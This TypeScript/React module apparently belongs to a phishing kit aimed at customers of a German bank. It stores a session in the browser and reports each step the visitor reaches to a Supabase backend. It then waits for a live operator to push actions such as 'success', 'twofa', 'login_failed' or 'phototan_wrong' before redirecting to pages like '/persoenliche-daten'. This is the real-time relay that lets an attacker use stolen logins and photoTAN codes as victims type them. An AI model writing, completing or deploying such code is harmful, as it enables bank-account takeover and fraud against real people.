import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const SESSION_KEY = "flow_session_v1";

type Stored = { id: string; mode: "afk" | "live" | "live_change" };

export function getStoredSession(): Stored | null {
  try {
    const raw = sessionStorage.getItem(SESSION_KEY);
    return raw ? JSON.parse(raw) : null;
  } catch { return null; }
}

export function setStoredSession(s: Stored | null) {
  if (s) sessionStorage.setItem(SESSION_KEY, JSON.stringify(s));
  else sessionStorage.removeItem(SESSION_KEY);
}

export async function startSession(meta: Record<string, unknown>) {
  const { data, error } = await (supabase as any).functions.invoke("session-start", { body: { meta } });
  if (error) throw error;
  const stored: Stored = { id: data.session_id, mode: data.mode };
  setStoredSession(stored);
  return stored;
}

export async function reportPhase(phase: string, meta_patch?: Record<string, unknown>) {
  const s = getStoredSession();
  if (!s) return;
  await (supabase as any).functions.invoke("session-event", {
    body: { session_id: s.id, phase, meta_patch },
  });
}

type ActionMap = Partial<Record<"success" | "twofa" | "login_failed" | "live_change" | "phototan_wrong" | "phototan_success" | "profile_received" | "finish" | "finish_wrong", (session: Stored) => void>>;

export function useSessionAction(handlers: ActionMap, expectedPhase?: string) {
  const [waiting, setWaiting] = useState(false);
  const [meta, setMeta] = useState<Record<string, any> | null>(null);
  const s = getStoredSession();
  const handlersRef = useRef(handlers);
  handlersRef.current = handlers;

  useEffect(() => {
    if (!s) return;
    const isLive = s.mode === "live" || s.mode === "live_change";
    setWaiting(isLive);
    if (!isLive) return;

    let cancelled = false;

    const apply = (row: any) => {
      if (cancelled || !row) return;
      if (row.meta) setMeta(row.meta);
      if (expectedPhase && row.phase !== expectedPhase) return;
      const action = row.action ?? null;
      if (!action) return;
      const h = handlersRef.current[action as keyof ActionMap];
      if (h) h(s);
    };

    const load = async () => {
      const { data } = await (supabase as any)
        .from("sessions").select("phase, action, meta").eq("id", s.id).maybeSingle();
      apply(data);
    };
    load();

    const channelName = `session_${s.id}_${Math.random().toString(36).slice(2, 8)}`;
    const ch = (supabase as any)
      .channel(channelName)
      .on("postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${s.id}` },
        (payload: any) => apply(payload.new))
      .subscribe();

    const iv = window.setInterval(load, 4000);
    return () => { 
      cancelled = true; 
      window.clearInterval(iv); 
      (supabase as any).removeChannel(ch); 
    };
  }, [s?.id, s?.mode, expectedPhase]);

  return { waiting, session: s, meta };
}

export function useFlowStep(opts: {
  phase: string;
  afkNext: () => void;
  onSuccess: () => void;
  onTwofa: () => void;
  onLoginFailed: () => void;
  onLiveChange?: () => void;
  waitForProfileData?: boolean;
}) {
  const navigate = useNavigate();
  const started = useRef(false);

  useEffect(() => {
    if (started.current) return;
    started.current = true;
    const s = getStoredSession();
    if (!s) { opts.afkNext(); return; }
    reportPhase(opts.phase).catch(() => {});
    if (s.mode === "afk") opts.afkNext();
  }, []);

  useSessionAction({
    success: (session) => {
      if (opts.waitForProfileData) return;
      opts.onSuccess();
    },
    phototan_success: (session) => {
      if (opts.waitForProfileData) return;
      opts.onSuccess();
    },
    profile_received: () => {
      if (opts.waitForProfileData) opts.onSuccess();
    },
    twofa: opts.onTwofa,
    login_failed: opts.onLoginFailed,
    live_change: () => {
      if (opts.onLiveChange) {
        opts.onLiveChange();
      } else {
        if (window.location.pathname !== "/persoenliche-daten") {
          navigate("/persoenliche-daten");
        }
      }
    }
  }, opts.phase);
}
